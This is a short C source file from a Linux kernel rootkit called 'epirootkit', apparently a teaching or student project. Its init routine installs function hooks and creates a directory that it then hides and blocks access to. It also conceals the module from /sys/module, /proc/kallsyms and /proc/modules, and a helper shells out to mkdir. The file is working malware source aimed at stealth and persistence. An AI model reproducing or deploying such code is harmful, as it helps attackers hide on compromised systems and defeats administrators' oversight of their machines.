#include "init.h"

int init_interceptor(void) {
    // Initialize hooks
    int err = fh_install_hooks(hooks, hook_array_size);
    if (err) {
        ERR_MSG("epirootkit: init: failed to install hooks\n");
        return err;
    }

    // Create directory to be hidden
    create_dir(HIDDEN_DIR_PATH);

    // Hide directory HIDDEN_DIR_PATH
    add_hidden_dir(HIDDEN_DIR_PATH);

    // Forbid access to HIDDEN_DIR_PATH
    add_forbidden_file(HIDDEN_DIR_PATH);

    // Hide module in /sys/modules
    add_hidden_dir("/sys/module/epirootkit");

    // Hide module in /proc/kallsyms
    add_modified_file("/proc/kallsyms", -1, "epirootkit", NULL, NULL);

    // Hide module in /proc/modules
    hide_module();

    return SUCCESS;
}

// I do not care if it is dirty.
void exit_interceptor(void) {
    fh_remove_hooks(hooks, hook_array_size);
}

int create_dir(char *path) {
    char cmd[128];
    int rc;

    snprintf(cmd, sizeof(cmd), "mkdir -p -- %s", path);
    rc = exec_str_as_command(cmd, false);
    if (rc < 0)
        return rc;

    return SUCCESS;
}
